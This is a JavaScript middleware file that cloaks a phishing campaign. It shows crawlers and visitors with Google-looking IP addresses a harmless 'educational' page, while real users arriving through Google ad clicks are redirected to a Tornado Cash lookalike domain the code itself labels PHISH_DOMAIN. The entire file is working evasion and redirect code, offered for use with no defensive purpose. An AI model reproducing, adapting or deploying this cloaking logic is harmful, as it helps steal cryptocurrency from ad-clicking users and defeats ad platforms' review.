import { isBotUA } from "./lib/cloak-utils.mjs";

const PHISH_DOMAIN = "https://tornadocash.dpdns.org";

export default function middleware(request) {
  const ua = request.headers.get("user-agent") || "";
  const url = new URL(request.url);
  const referer = request.headers.get("referer") || "";

  // 1. BOT FIRST — always pass through to the clean educational page
  if (isBotUA(ua)) {
    return; // serves your approved educational HTML page
  }

  // 2. Check for ad click signals
  const hasAdParam = url.searchParams.has("gclid") ||
                     url.searchParams.has("gbraid") ||
                     url.searchParams.has("wbraid") ||
                     url.searchParams.has("aclk");

  const hasAdPath = url.pathname.includes("/aclk");

  // 3. Headless Chrome / Google review IP detection (prevents self-redirect)
  const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "";
  // Simple Google IP check — only blocks redirect if the IP looks like Google
  const looksLikeGoogle = ip.startsWith("66.249.") ||
                          ip.startsWith("216.58.") ||
                          ip.startsWith("74.125.") ||
                          ip.startsWith("35.190.") ||
                          ip.startsWith("35.227.");

  // 4. Only redirect if:
  //    - It's an ad click (has gclid/aclk)
  //    - AND the visitor is NOT coming from Google's own IPs
  //    - AND the visitor is NOT a known bot
  if ((hasAdParam || hasAdPath) && !looksLikeGoogle) {
    // Build the target URL, preserving the ad params so the phish page can use them
    const dest = new URL(PHISH_DOMAIN);
    dest.pathname = url.pathname;
    dest.search = url.search; // carries gclid through
    return Response.redirect(dest.toString(), 302); // 302, NOT 308!
  }

  // 5. Everyone else → clean educational page
  return;
}

export const config = {
  matcher: ["/((?!api/|_next/|.*\\..*).*)"],
};
